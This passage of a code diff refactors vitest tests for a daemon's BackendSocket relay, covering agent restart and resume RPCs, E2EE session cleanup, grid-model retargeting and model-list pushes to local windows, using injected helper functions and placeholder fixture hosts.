-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:refusal', {
       sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true,
@@ -1924,7 +2269,7 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('sends a device focus request to one desktop window only', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const first = vi.fn(() => true), second = vi.fn(() => true)
     const frame = { type: 'device_focus', payload: { agentId: 'first' } }
     expect(socket.sendFirstLocal(frame)).toBe(false)
@@ -1940,7 +2285,7 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('hands a blocked agent to the window without putting the question on the cloud leg', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     expect(socket.hasLocalClient()).toBe(false)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:window', {
@@ -1975,7 +2320,7 @@ describe('BackendSocket outbound queue', () => {
 
   it('routes local terminal binary directly and preserves local streams when cloud disconnects', async () => {
     vi.useFakeTimers()
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const handleBinary = vi.fn(async () => undefined)
     const closeConnection = vi.fn(async () => undefined)
     const closeConnectionsWhere = vi.fn(async (
@@ -2023,7 +2368,7 @@ describe('BackendSocket outbound queue', () => {
 
   it('reports the window itself: open when it attaches, ping once a minute while it stays, nothing while offline', async () => {
     vi.useFakeTimers()
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const sink = { sendFrame: () => true, sendBinary: () => true }
     const kinds = (ws: InstanceType<typeof wsMock.MockWebSocket>) => parseSent(ws)
       .filter((m) => (m.frame as { type?: string } | undefined)?.type === 'app_presence')
@@ -2076,7 +2421,7 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('reports commander presence only when it crosses zero', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const changes: boolean[] = []
     socket.onCommanderPresenceChanged = (connected) => changes.push(connected)
     socket.connect()
@@ -2102,8 +2447,8 @@ describe('BackendSocket outbound queue', () => {
   // dashboard's device dot reads `deviceE2eeConnected()`, so a session left behind reports a device that
   // may have been gone for hours.
   it('drops the device E2EE session when the count reaches zero', async () => {
-    const socket = new BackendSocket('token')
-    const drop = vi.spyOn(socket.e2ee, 'dropSessionsByRole')
+    const socket = relaySocket('token')
+    const drop = vi.spyOn(gatewayOf(socket).e2ee, 'dropSessionsByRole')
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
@@ -2119,8 +2464,8 @@ describe('BackendSocket outbound queue', () => {
 
   it('drops the device E2EE session when OUR backend link dies, not just when the backend says so', async () => {
     vi.useFakeTimers()
-    const socket = new BackendSocket('token')
-    const drop = vi.spyOn(socket.e2ee, 'dropSessionsByRole')
+    const socket = relaySocket('token')
+    const drop = vi.spyOn(gatewayOf(socket).e2ee, 'dropSessionsByRole')
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
@@ -2136,14 +2481,14 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('releases E2EE and terminal state for the exact disconnected web connId', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const closeConnection = vi.fn(async () => undefined)
     const stop = vi.fn(async () => undefined)
     socket.setTerminalStreamManager({
       closeConnection,
       stop,
     } as unknown as TerminalStreamManager)
-    const dropSession = vi.spyOn(socket.e2ee, 'dropSession')
+    const dropSession = vi.spyOn(gatewayOf(socket).e2ee, 'dropSession')
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
@@ -2177,7 +2522,7 @@ describe('desk_changed relay', () => {
   })
 
   it('hands the backend\'s desk_changed to the window, and only the backend\'s', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:desk', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
     socket.connect()
@@ -2194,7 +2539,7 @@ describe('desk_changed relay', () => {
   })
 
   it('hands the backend\'s zoo_changed to the window as its own frame, and only the backend\'s', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:zoo', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
     socket.connect()
@@ -2228,7 +2573,8 @@ describe('agent_fork RPC', () => {
   }
 
   function localSocket(): { socket: BackendSocket; frames: Array<Record<string, unknown>> } {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:fork', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
     return { socket, frames }
@@ -2375,7 +2721,9 @@ describe('agent_restart RPC', () => {
   }
 
   function localSocket(): { socket: BackendSocket; frames: Array<Record<string, unknown>> } {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
+    bindAgentList(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:restart', {
       sendFrame: (frame) => { frames.push(frame); return true },
@@ -2406,8 +2754,8 @@ describe('agent_restart RPC', () => {
     vi.spyOn(registry, 'advertised').mockReturnValue([BASE_SESSION])
     vi.spyOn(registry, 'list').mockReturnValue([BASE_SESSION])
     vi.spyOn(stoppedAgents, 'available').mockReturnValue([{ ...BASE_SESSION, agentId: 'stopped' }])
-    socket.harnessResourcesReader = vi.fn(async () => ({ sampledAt: new Date().toISOString(), agents: [{ agentId: 'agent-1', memoryBytes: 123, cpuPercent: 2, processCount: 1 }] }))
-    socket.monitorActivityProvider = sessionId => sessionId === BASE_SESSION.sessionId ? 'needsInput' : 'idle'
+    const resources = vi.fn(async () => ({ sampledAt: new Date().toISOString(), agents: [{ agentId: 'agent-1', memoryBytes: 123, cpuPercent: 2, processCount: 1 }] }))
+    bindAgentList(socket, { harnessResourcesReader: resources, monitorActivityProvider: sessionId => sessionId === BASE_SESSION.sessionId ? 'needsInput' : 'idle' })
     for (const [requestId, monitor] of [['plain', false], ['monitor', true]] as const) {
       socket.handleLocalFrame('local:restart', { type: 'agents_list', payload: { requestId, monitor, includeStopped: true } })
     }
@@ -2416,14 +2764,14 @@ describe('agent_restart RPC', () => {
     expect(response('plain').every((agent: any) => agent.monitor === undefined)).toBe(true)
     expect(response('monitor').find((a: any) => a.id === 'agent-1').monitor).toMatchObject({ activity: 'needsInput', activityKnown: true, rssBytes: 123, cpu: 2, pid: BASE_SESSION.processIdentity?.pid ?? null })
     expect(response('monitor').find((a: any) => a.id === 'stopped').monitor).toMatchObject({ rssBytes: 0, cpu: 0, pid: null })
-    expect(socket.harnessResourcesReader).toHaveBeenCalledOnce()
+    expect(resources).toHaveBeenCalledOnce()
     await socket.unregisterLocalClient('local:restart'); await socket.stop()
   })
 
   it('rejects a stop when the reviewed conversation rotated before the command arrived', async () => {
     const { socket, frames } = localSocket()
     const stop = vi.fn(async () => {})
-    socket.onDeleteAgent = stop
+    bindStopRequest(socket, stop)
     vi.spyOn(registry, 'byAgent').mockReturnValue({ ...BASE_SESSION, sessionId: 'replacement' })
     socket.handleLocalFrame('local:restart', { type: 'agent_delete', payload: {
       requestId: 'stale-stop', agentId: BASE_SESSION.agentId, expectedSessionId: BASE_SESSION.sessionId,
@@ -2439,7 +2787,7 @@ describe('agent_restart RPC', () => {
     const { socket, frames } = localSocket()
     const creationId = `resume-${randomUUID()}`
     const handler = vi.fn(async () => ({ ok: true as const, session: BASE_SESSION, resumed: true }))
-    socket.onResumeAgent = handler
+    bindLaunchRequests(socket, { resume: handler })
     vi.spyOn(registry, 'byAgent').mockReturnValue(BASE_SESSION)
     for (const requestId of ['first', 'again']) {
       socket.handleLocalFrame('local:restart', { type: 'agent_resume', payload: { requestId, agentId: 'agent-1', creationId } })
@@ -2454,7 +2802,7 @@ describe('agent_restart RPC', () => {
     const { socket, frames } = localSocket()
     const creationId = `resume-mode-${randomUUID()}`
     const handler = vi.fn(async () => ({ ok: true as const, session: { ...BASE_SESSION, permissionMode: 'auto' }, resumed: true }))
-    socket.onResumeAgent = handler
+    bindLaunchRequests(socket, { resume: handler })
     vi.spyOn(registry, 'byAgent').mockReturnValue(BASE_SESSION)
     for (const [requestId, permissionMode] of [['first', 'auto'], ['again', 'auto'], ['changed', 'ask']]) {
       socket.handleLocalFrame('local:restart', { type: 'agent_resume', payload: { requestId, agentId: 'agent-1', creationId, permissionMode } })
@@ -2467,10 +2815,11 @@ describe('agent_restart RPC', () => {
 
   it.each([7, '', 'allow', { auto: true }])('refuses invalid resume permission payload %j', async permissionMode => {
     const { socket, frames } = localSocket()
-    socket.onResumeAgent = vi.fn()
+    const resume = vi.fn()
+    bindLaunchRequests(socket, { resume })
     socket.handleLocalFrame('local:restart', { type: 'agent_resume', payload: { requestId: 'bad-mode', agentId: 'agent-1', permissionMode } })
     await vi.waitFor(() => expect(frames).toContainEqual({ type: 'agent_resume_result', payload: { requestId: 'bad-mode', error: 'INVALID_PERMISSION_MODE' } }))
-    expect(socket.onResumeAgent).not.toHaveBeenCalled()
+    expect(resume).not.toHaveBeenCalled()
     await socket.unregisterLocalClient('local:restart'); await socket.stop()
   })
 
@@ -2497,10 +2846,10 @@ describe('agent_restart RPC', () => {
   it('delegates to onRestartAgent and replies with the agent projection and the resumed flag on success', async () => {
     const { socket, frames } = localSocket()
     let seenAgentId: string | undefined
-    socket.onRestartAgent = async (agentId) => {
+    bindLaunchRequests(socket, { restart: async (agentId) => {
       seenAgentId = agentId
       return { ok: true, session: BASE_SESSION, resumed: true }
-    }
+    } })
     socket.handleLocalFrame('local:restart', { type: 'agent_restart', payload: { requestId: 'r1', agentId: 'agent-1' } })
     await vi.waitFor(() => {
       const result = frames.find((f) => f.type === 'agent_restart_result')
@@ -2520,7 +2869,7 @@ describe('agent_restart RPC', () => {
 
   it('reports a fresh (non-resumed) relaunch through the same resumed flag', async () => {
     const { socket, frames } = localSocket()
-    socket.onRestartAgent = async () => ({ ok: true, session: BASE_SESSION, resumed: false })
+    bindLaunchRequests(socket, { restart: async () => ({ ok: true, session: BASE_SESSION, resumed: false }) })
     socket.handleLocalFrame('local:restart', { type: 'agent_restart', payload: { requestId: 'r1', agentId: 'agent-1' } })
     await vi.waitFor(() => {
       const result = frames.find((f) => f.type === 'agent_restart_result')
@@ -2532,9 +2881,9 @@ describe('agent_restart RPC', () => {
 
   it('replies with error+detail on failure, matching agent_create/agent_delete\'s reply shape', async () => {
     const { socket, frames } = localSocket()
-    socket.onRestartAgent = async () => (
+    bindLaunchRequests(socket, { restart: async () => (
       { ok: false, error: 'RESTART_FAILED', detail: 'claude did not come back up after restart' }
-    )
+    ) })
     socket.handleLocalFrame('local:restart', { type: 'agent_restart', payload: { requestId: 'r1', agentId: 'agent-1' } })
     await vi.waitFor(() => expect(frames).toContainEqual({
       type: 'agent_restart_result',
@@ -2552,7 +2901,7 @@ describe('agent_restart RPC', () => {
       await new Promise<void>((resolve) => { finish = resolve })
       return { ok: true as const, session: BASE_SESSION, resumed: false }
     })
-    socket.onRestartAgent = handler
+    bindLaunchRequests(socket, { restart: handler })
     vi.spyOn(registry, 'byAgent').mockImplementation((id) => id === BASE_SESSION.agentId ? BASE_SESSION : undefined)
     const request = (requestId: string, type = 'agent_restart') => socket.handleLocalFrame('local:restart', { type, payload: { requestId, agentId: 'agent-1', creationId } })
     const response = (id: string) => frames.find((frame) => (frame.payload as { requestId?: string }).requestId === id)?.payload
@@ -2576,7 +2925,7 @@ describe('agent_restart RPC', () => {
     const { socket, frames } = localSocket()
     const creationId = `restart-receipt-${error}`
     const handler = vi.fn(async () => ({ ok: false as const, error, detail: 'fixture refusal' }))
-    socket.onRestartAgent = handler
+    bindLaunchRequests(socket, { restart: handler })
     for (const requestId of ['first', 'again']) {
       socket.handleLocalFrame('local:restart', { type: 'agent_restart', payload: { requestId, agentId: 'agent-1', creationId } })
       await vi.waitFor(() => expect(frames.find((frame) => (frame.payload as { requestId?: string }).requestId === requestId)?.payload).toMatchObject({ creationId, state: error === 'RESTART_FAILED' ? 'unconfirmed' : 'failed' }))
@@ -2588,50 +2937,13 @@ describe('agent_restart RPC', () => {
 
   it('omits detail on failure when the handler did not supply one', async () => {
     const { socket, frames } = localSocket()
-    socket.onRestartAgent = async () => ({ ok: false, error: 'AGENT_NOT_FOUND' })
+    bindLaunchRequests(socket, { restart: async () => ({ ok: false, error: 'AGENT_NOT_FOUND' }) })
     socket.handleLocalFrame('local:restart', { type: 'agent_restart', payload: { requestId: 'r1', agentId: 'agent-1' } })
     await vi.waitFor(() => expect(frames).toContainEqual({
       type: 'agent_restart_result', payload: { requestId: 'r1', error: 'AGENT_NOT_FOUND' },
     }))
     await socket.unregisterLocalClient('local:restart')
     await socket.stop()
-  })
-})
-
-describe('compact runtime picker catalog', () => {
-  const models = [
-    { id: 'runtime-v1:s1:codex:gpt-5.6-sol@auto', displayName: 'Sol / Auto' },
-    { id: 'runtime-v1:s1:codex:gpt-5.6-sol@medium', displayName: 'Sol / Medium' },
-    { id: 'runtime-v1:s1:codex:gpt-5.6-sol@high', displayName: 'Sol / High' },
-    { id: 'runtime-v1:s1:codex:o3@high', displayName: 'o3 / High' },
-    { id: 'runtime-v1:s2:claude:sonnet@high', displayName: 'Sonnet / High' },
-  ]
-
-  it('returns only explicit efforts for the selected session model', () => {
-    expect(compactRuntimePickerModels(
-      models,
-      's1',
-      'effort',
-      'runtime-v1:s1:codex:gpt-5.6-sol@medium',
-    )).toEqual([
-      { id: 'runtime-v1:s1:codex:gpt-5.6-sol@medium' },
-      { id: 'runtime-v1:s1:codex:gpt-5.6-sol@high' },
-    ])
-  })
-
-  it('caps the device model list and keeps the running model in it', () => {
-    // Devin publishes 72 models; a 49-row wheel already tripped the device's task watchdog once.
-    const many = Array.from({ length: 40 }, (_, i) => ({
-      id: `runtime-v1:s1:devin:model-${i}@auto`,
-      displayName: `Model ${i}`,
-    }))
-    const capped = compactRuntimePickerModels(many, 's1', 'model', 'runtime-v1:s1:devin:model-39@auto')
-
-    expect(capped).toHaveLength(24)
-    // The model the agent is running would have fallen off the end of the catalog order.
-    expect(capped[0]).toEqual({ id: 'runtime-v1:s1:devin:model-39@auto' })
-    // The web asks without a picker mode and still gets the whole catalog.
-    expect(compactRuntimePickerModels(many, 's1', undefined, null)).toHaveLength(40)
   })
 })
 
@@ -2684,19 +2996,19 @@ describe('Grok session_get history', () => {
 })
 
 describe('adapter-ws dial url', () => {
-  const dialUrl = (socket: BackendSocket): string => (socket as unknown as { url: string }).url
+  const dialUrl = (socket: BackendSocket): string => upstreamOf(socket).url
 
   it('carries the machine id this daemon still holds, so a revoked one gets 403 not a new machine', () => {
     const machineId = 'b'.repeat(32)
 
-    expect(dialUrl(new BackendSocket(machineId, undefined, () => {}, 'computer-1')))
+    expect(dialUrl(relaySocket(machineId, undefined, () => {}, 'computer-1')))
       .toContain(`&machine=${machineId}`)
   })
 
   it('omits the claim when the first argument is a test token rather than a machine id', () => {
     // Constructed without an AuthSessionManager, the first argument is a token — sending it as a
     // machine id would be a lie the backend then has to reject.
-    expect(dialUrl(new BackendSocket('token', undefined, () => {}, 'computer-1'))).not.toContain('&machine=')
+    expect(dialUrl(relaySocket('token', undefined, () => {}, 'computer-1'))).not.toContain('&machine=')
   })
 })
 
@@ -2715,11 +3027,12 @@ describe('agent_retarget clearGrid', () => {
 
   async function retarget(payload: Record<string, unknown>) {
     const seen: Array<{ agentId: string; grid: unknown }> = []
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     socket.onRetargetAgent = async (input) => { seen.push(input); return { ok: true } }
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
+    withSession(socket, 'web-1')
     ws.message(sealedDown(socket, 'web-1', 'agent_retarget', payload))
     await vi.waitFor(() => expect(ws.sent.length).toBeGreaterThan(0))
     const reply = parseSent(ws)
@@ -2769,13 +3082,16 @@ describe('agent_retarget onto a Local model resolves web tools', () => {
 
   async function retargetOntoLocalModel(model: string) {
     const seen: Array<{ agentId: string; grid: unknown }> = []
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     socket.onRetargetAgent = async (input) => { seen.push(input); return { ok: true } }
+    // Where the move goes is the models service's: it resolves the target from this machine's own grid.
+    serveModels(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
     // The grid name is the backend's, pushed on connect; the daemon holds it in memory only.
     ws.message({ t: 'down', connId: '', frame: { type: 'machine_meta', payload: { name: 'mac', gridName: GRID_NAME } } })
+    withSession(socket, 'web-1')
     ws.message(sealedDown(socket, 'web-1', 'agent_retarget', { requestId: 'r', agentId: 'a1', gridModel: model }))
     await vi.waitFor(() => expect(parseSent(ws).some((item) => (item.frame as { type?: string } | undefined)?.type === 'agent_retarget_result')).toBe(true), { timeout: 10_000 })
     const reply = parseSent(ws)
@@ -2839,7 +3155,8 @@ describe('agent_create with a prompt, a name and a named agent', () => {
   }
 
   async function create(choices: Record<string, unknown>) {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:named', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
     const seen: unknown[] = []
@@ -2937,11 +3254,13 @@ describe('grid_models_list says whether this machine has a grid CLI', () => {
   })
 
   async function listModels(): Promise<Record<string, unknown> | undefined> {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    serveModels(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
     ws.message({ t: 'down', connId: '', frame: { type: 'machine_meta', payload: { name: 'mac', gridName: GRID_NAME } } })
+    withSession(socket, 'web-1')
     ws.message(sealedDown(socket, 'web-1', 'grid_models_list', { requestId: 'r' }))
     await vi.waitFor(() => expect(parseSent(ws).some((item) => (item.frame as { type?: string } | undefined)?.type === 'grid_models_list_result')).toBe(true), { timeout: 10_000 })
     const reply = parseSent(ws)
@@ -2958,26 +3277,15 @@ describe('grid_models_list says whether this machine has a grid CLI', () => {
   })
 })
 
-describe('grid is set up on demand — by an act, never by a read', () => {
-  afterEach(() => { vi.restoreAllMocks() })
-
-  const READY: GridAttachResult = { status: 'signed-in', name: 'kelvin-1a2b3c4d', detail: '', ownGrid: 'created' }
-
-  /** A daemon whose grid set-up and local models are stubs, asked over a local frame. */
-  function daemon(ready: GridAttachResult = READY) {
-    const socket = new BackendSocket('token')
-    socket.deriveGridName = async () => 'kelvin-1a2b3c4d'
-    let setUp = false
-    const ensureGrid = vi.fn(async (_request?: { ownGrid?: boolean }) => {
-      if (ready.status === 'signed-in' || ready.status === 'converged') setUp = true
-      return ready
-    })
-    socket.ensureGrid = ensureGrid
-    socket.gridSetUp = () => setUp
-    const list = vi.fn(async () => ({ models: [], observedAt: 'now', busy: false }))
-    const act = vi.fn(async () => ({}))
-    Object.assign(socket as unknown as Record<string, unknown>, { localModels: { list, act } })
-    socket.onRetargetAgent = async () => ({ ok: true })
+describe('a move onto a grid model asks models where it goes', () => {
+  /** A daemon whose models is a stub, asked over a local frame. Where the move goes, grid's set-up before
+   *  it and the prewarm after it are the models service's (services/models.spec.ts). */
+  function daemon(moveTarget: ModelsPort['moveTarget'] | null) {
+    const socket = relaySocket('token')
+    const moved = vi.fn()
+    if (moveTarget) socket.models = () => ({ annotation: () => null, lists: () => Promise.reject(new Error('no lists')), moveTarget, moved })
+    const retargeted = vi.fn(async (_request: { agentId: string; grid: unknown }) => ({ ok: true as const }))
+    socket.onRetargetAgent = retargeted
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:grid', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
     let asked = 0
@@ -2990,74 +3298,100 @@ describe('grid is set up on demand — by an act, never by a read', () => {
       await vi.waitFor(() => expect(answer()).toBeDefined())
       return answer()!
     }
-    return { socket, ensureGrid, list, act, ask, done: async () => { await socket.unregisterLocalClient('local:grid'); await socket.stop() } }
+    return { socket, moved, retargeted, ask, done: async () => { await socket.unregisterLocalClient('local:grid'); await socket.stop() } }
   }
+  const TARGET = { networkId: 'net-1', networkName: 'team-grid-0000aaaa', baseUrl: 'https://fixture.invalid/g/net-1/relay/v1', apiKey: 'fixture-key', model: 'Shared-Model' }
 
-  it('the list read a picker polls sets nothing up, and says when it is needed', async () => {
-    const d = daemon()
-    const answer = await d.ask('grid_fleet_models_list')
-    expect(d.ensureGrid).not.toHaveBeenCalled()
-    expect(answer).toMatchObject({ gridSetupNeeded: true })
+  it('moves onto what models resolved, from the grid the model was picked from, and has models start it', async () => {
+    const moveTarget = vi.fn(async () => ({ target: TARGET }))
+    const d = daemon(moveTarget)
+    expect(await d.ask('agent_retarget', { agentId: 'a1', gridModel: 'Shared-Model', gridName: ' team-grid-0000aaaa ' })).toEqual({ requestId: 'agent_retarget-1', retargeted: true })
+    expect(moveTarget).toHaveBeenCalledWith({ gridName: 'team-grid-0000aaaa', model: 'Shared-Model' })
+    expect(d.retargeted).toHaveBeenCalledWith({ agentId: 'a1', grid: TARGET })
+    expect(d.moved).toHaveBeenCalledWith(TARGET)
+    // The account's own grid when the picker names none.
+    await d.ask('agent_retarget', { agentId: 'a1', gridModel: 'Own-Model' })
+    expect(moveTarget).toHaveBeenLastCalledWith({ gridName: null, model: 'Own-Model' })
     await d.done()
   })
 
-  it("Set up — a list read carrying `setup` — signs grid in with the account's own grid, then answers", async () => {
-    const d = daemon()
-    const answer = await d.ask('grid_fleet_models_list', { setup: true })
-    expect(d.ensureGrid).toHaveBeenCalledExactlyOnceWith({ ownGrid: true })
-    expect(answer).not.toHaveProperty('gridSetupNeeded')
-    expect(answer).not.toHaveProperty('gridSetupError')
-    // Read fresh: the catalog was unreachable a moment ago.
-    expect(d.list).toHaveBeenCalledWith('kelvin-1a2b3c4d', true)
-    await d.done()
-  })
-
-  it("a Get signs grid in; a Use also makes sure of the account's grid; a Stop does neither", async () => {
-    const d = daemon()
-    await d.ask('grid_fleet_model_download', { modelId: 'org/Model-GGUF' })
-    await d.ask('grid_fleet_model_start', { modelId: 'org/Model-GGUF' })
-    await d.ask('grid_fleet_model_stop', { modelId: 'org/Model-GGUF' })
-    expect(d.ensureGrid.mock.calls).toEqual([[{ ownGrid: false }], [{ ownGrid: true }]])
-    expect(d.act.mock.calls.map((call) => (call as unknown[])[2])).toEqual(['download', 'start', 'stop'])
-    await d.done()
-  })
-
-  it('a set-up grid refused is said, and the act waiting on it does not run', async () => {
-    const d = daemon({ status: 'handoff-failed', name: 'kelvin-1a2b3c4d', detail: 'grid is too old for --harness' })
-    expect(await d.ask('grid_fleet_model_start', { modelId: 'org/Model-GGUF' })).toMatchObject({ error: 'grid is too old for --harness' })
-    expect(d.act).not.toHaveBeenCalled()
-    expect(await d.ask('grid_fleet_models_list', { setup: true }))
-      .toMatchObject({ gridSetupNeeded: true, gridSetupError: 'grid is too old for --harness' })
-    await d.done()
-  })
-
-  it("an account grid that could not be made fails a Use, not a Get", async () => {
-    const d = daemon({ status: 'signed-in', name: 'kelvin-1a2b3c4d', detail: 'free plan: one grid per account', ownGrid: 'failed' })
-    expect(await d.ask('grid_fleet_model_start', { modelId: 'org/Model-GGUF' })).toMatchObject({ error: 'free plan: one grid per account' })
-    await d.ask('grid_fleet_model_download', { modelId: 'org/Model-GGUF' })
-    expect(d.act.mock.calls.map((call) => (call as unknown[])[2])).toEqual(['download'])
-    await d.done()
-  })
-
-  it('a Grid harness command runs against grid as it stands — its viewer asks on its own, so it never sets grid up', async () => {
-    const d = daemon()
-    const run = vi.fn(async () => ({ ok: true, code: 0, stdout: '[]', stderr: '', error: null }))
-    Object.assign(d.socket as unknown as Record<string, unknown>, { gridFleet: { run, cancel: () => false } })
-    await d.ask('grid_fleet_run', { args: ['--remote', 'ls', '--json'], timeoutMs: 5_000 })
-    expect(run).toHaveBeenCalledTimes(1)
-    expect(d.ensureGrid).not.toHaveBeenCalled()
-    await d.done()
-  })
-
-  it("a move onto a grid model signs grid in first — with the account's own grid only when the model is on it", async () => {
-    // Refused, so the move stops at the set-up and no grid is read: what is pinned is what was asked.
-    const d = daemon({ status: 'handoff-failed', name: null, detail: 'no grid on this computer' })
+  it('says why it cannot move, in models\' words, and moves nothing', async () => {
+    const d = daemon(async () => ({ detail: 'no grid on this computer' }))
     expect(await d.ask('agent_retarget', { agentId: 'a1', gridModel: 'Shared-Model', gridName: 'team-grid-0000aaaa' }))
       .toMatchObject({ error: 'GRID_UNAVAILABLE', detail: 'no grid on this computer' })
-    expect(await d.ask('agent_retarget', { agentId: 'a1', gridModel: 'Own-Model' }))
-      .toMatchObject({ error: 'GRID_UNAVAILABLE' })
-    expect(d.ensureGrid.mock.calls).toEqual([[{ ownGrid: false }], [{ ownGrid: true }]])
+    expect(d.retargeted).not.toHaveBeenCalled()
+    expect(d.moved).not.toHaveBeenCalled()
     await d.done()
+  })
+
+  it('with models down or off, the move answers GRID_UNAVAILABLE at once', async () => {
+    for (const down of [async () => { throw new Error('models is down') }, null]) {
+      const d = daemon(down)
+      expect(await d.ask('agent_retarget', { agentId: 'a1', gridModel: 'Own-Model' }))
+        .toMatchObject({ error: 'GRID_UNAVAILABLE', detail: 'Models are unavailable. Try again.' })
+      expect(d.retargeted).not.toHaveBeenCalled()
+      await d.done()
+    }
+  })
+
+  it('a move onto an API, or back onto the own login, asks models nothing', async () => {
+    const moveTarget = vi.fn()
+    const d = daemon(moveTarget)
+    expect(await d.ask('agent_retarget', { agentId: 'a1', clearGrid: true })).toMatchObject({ retargeted: true })
+    expect(moveTarget).not.toHaveBeenCalled()
+    expect(d.moved).not.toHaveBeenCalled()
+    await d.done()
+  })
+})
+
+describe('the models lists pushed to the windows', () => {
+  it('pushes each window the list in the form it asked for, as models built it; nothing while models is off or failing', async () => {
+    const socket = relaySocket('token')
+    const rows: Array<Record<string, unknown>> = []
+    const plain: Array<Record<string, unknown>> = []
+    socket.registerLocalClient('local:rows', { sendFrame: (frame) => { rows.push(frame); return true }, sendBinary: () => true })
+    socket.registerLocalClient('local:plain', { sendFrame: (frame) => { plain.push(frame); return true }, sendBinary: () => true })
+    // A window that draws row state says so when it asks for the list.
+    socket.handleLocalFrame('local:rows', { type: 'grid_models_list', payload: { requestId: 'r1', rowState: true } })
+    await vi.waitFor(() => expect(rows.some((frame) => frame.type === 'grid_models_list_result')).toBe(true))
+    rows.length = 0
+    plain.length = 0
+
+    await socket.pushGridModels()
+    socket.models = () => ({ ...MODELS_OFF, lists: async () => ({ plain: { form: 'plain' }, rowState: { form: 'rows' } }) })
+    await socket.pushGridModels()
+    expect(rows).toEqual([{ type: 'grid_models_changed', payload: { form: 'rows' } }])
+    expect(plain).toEqual([{ type: 'grid_models_changed', payload: { form: 'plain' } }])
+    socket.models = () => MODELS_OFF
+    await socket.pushGridModels()
+    expect(rows).toHaveLength(1)
+    await socket.unregisterLocalClient('local:rows')
+    await socket.unregisterLocalClient('local:plain')
+    await socket.stop()
+  })
+
+  it('carries models\' note on the grid an agent is on in every frame it builds, and none while models is off', async () => {
+    const socket = relaySocket('token')
+    const grid = { baseUrl: 'https://fixture.invalid/g/n1/relay/v1', model: 'm' }
+    const agent = { agentId: 'a-note', sessionId: 's-note', engine: 'claude', cwd: '/tmp', runtimes: [], registeredAt: 1, active: true, grid } as unknown as RegisteredSession
+    expect((await socket.toProject(agent)).grid).toEqual(grid)
+    socket.models = () => ({ ...MODELS_OFF, annotation: () => ({ state: 'asleep' as const }) })
+    expect((await socket.toProject(agent)).grid).toEqual({ ...grid, state: 'asleep' })
+    expect((await socket.toStoppedProject(agent)).grid).toEqual({ ...grid, state: 'asleep' })
+    await socket.stop()
+  })
+
+  it('answers the grid commands\' handshake itself, so a Grid harness never reads models being down as "update Harness"', async () => {
+    const socket = relaySocket('token')
+    socket.models = () => MODELS_OFF
+    const frames: Array<Record<string, unknown>> = []
+    socket.registerLocalClient('local:grid', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
+    socket.handleLocalFrame('local:grid', { type: 'grid_fleet_capabilities', payload: { requestId: 'c1' } })
+    await vi.waitFor(() => expect(frames.some((frame) => frame.type === 'grid_fleet_capabilities_result')).toBe(true))
+    expect(frames.find((frame) => frame.type === 'grid_fleet_capabilities_result')!.payload)
+      .toMatchObject({ requestId: 'c1', protocol: 1, maxTimeoutMs: 30 * 60_000, thinkingControl: true, gridCli: expect.any(String) })
+    await socket.unregisterLocalClient('local:grid')
+    await socket.stop()
   })
 })
 
@@ -3071,9 +3405,11 @@ describe('the connect burst with no network', () => {
     // two behind it past the app's 10s timeout — on which the app forced a reconnect and asked all
     // three again, for as long as the wifi stayed off. The terminal on the same computer read
     // "offline" the whole time.
-    const socket = new BackendSocket('token')
-    socket.deriveGridName = () => new Promise<null>(() => {}) // a grid read that never lands
-    socket.accountUsageReader = () => new Promise(() => {})   // a vendor that never answers
+    const socket = relaySocket('token')
+    bindAgentList(socket)
+    // A grid name that never comes, as a grid read that never lands; and a vendor that never answers, asked
+    // of the usage service beside models.
+    serveModels(socket, { account: { privateGridName: () => new Promise<null>(() => {}) } }).serve('usage', (core) => startUsage(core, { read: () => new Promise(() => {}) }), fakeCore(), USAGE_REQUESTS)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:burst', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
 
@@ -3093,7 +3429,7 @@ describe('machine_meta carries the grid name without clobbering it on rename', (
   afterEach(() => { wsMock.instances.length = 0 })
 
   it('keeps the grid name when a later rename frame omits gridName, and clears it only on an explicit null', async () => {
-    const socket = new BackendSocket('token')
